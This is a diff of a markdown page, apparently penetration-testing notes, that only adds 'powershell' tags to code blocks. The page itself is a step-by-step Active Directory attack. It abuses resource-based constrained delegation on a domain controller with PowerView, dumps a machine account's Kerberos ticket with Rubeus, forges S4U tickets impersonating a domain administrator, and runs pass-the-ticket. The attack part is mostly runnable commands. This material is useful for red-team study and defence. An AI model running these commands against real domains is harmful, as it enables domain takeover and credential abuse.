@@ -224,25 +224,25 @@ AccessControlList           : {WriteProperty}
 ```
 Above we can see wkstnAdmin has GenericWrite on dc$ computer as well as IT Admins group has WriteProperty on dc$. We will be using wkstnAdmin for this case. Now suppose we have admin access on `wkstn-1$` computer. We can setup `msds-AllowedToDelegateOnBehalfOfOtherIdentity` atribute on dc$ for `workstation-1$` computer using PowerView.
 
-```
+```powershell
 C:\Users\Alex\Desktop> Set-DomainRBCD -Identity dc -DelegateFrom 'workstation-1$'
 ```
 Check if RBCD has been succesfully set
-```
+```powershell
 C:\Users\Alex\Desktop> Get-DomainRBCD
 ```
 Now extract TGT of workstation-1$ computer account
-```
+```powershell
 C:\Users\Alex\Desktop> .\Rubeus.exe triage
 C:\Users\Alex\Desktop> .\Rubeus.exe dump /luid:0x4e5 /service:krbtgt /nowrap
 ```
 Using this TGT we perform s4u to get ST for itself s4u2self(workstation-1$) and s42proxy ST on behalf of alex(domain administrator) for dc$ computer
 
-```
+```powershell
 C:\Users\Alex\Desktop> Rubeus.exe s4u /user:workstation-1$ /impersonateuser:alex /msdsspn:host/dc.dev.dhitalcorp.local /ticket:eFnKuD3g5hjllhb5JTw== /nowrap
 ```
 Grab the final S4U2Proxy ticket and save in a file then use with Rubeus pass the ticket attack.
-```
+```powershell
 C:\Users\Alex> echo <base64ServiceTicket> > C:\Users\Alex\Desktop\ticket.kirbi
 C:\Users\Alex> .\Rubeus.exe ptt /ticket:C:\Users\Alex\Desktop\ticket.kirbi
 ```
